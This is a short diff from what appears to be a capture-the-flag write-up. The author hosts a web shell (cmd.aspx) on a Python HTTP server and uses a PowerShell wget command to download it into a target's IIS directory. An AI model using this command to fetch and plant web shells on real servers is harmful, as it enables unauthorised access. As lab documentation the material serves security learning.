@@ -700,5 +700,13 @@ Ill use this shell here and transfer it by python webserver
 python3 -m http.server 1000
 Serving HTTP on 0.0.0.0 port 1000 (http://0.0.0.0:1000/) ...
 ```
-Thi
+The shell is now hosted on my machine
+
+```python
+C:\inetpub\development>powershell -c wget http://10.10.14.90:1000/cmd.aspx -o cmd.aspx
+powershell -c wget http://10.10.14.90:1000/cmd.aspx -o cmd.aspx
+```
+This transferred the file
+
+
 
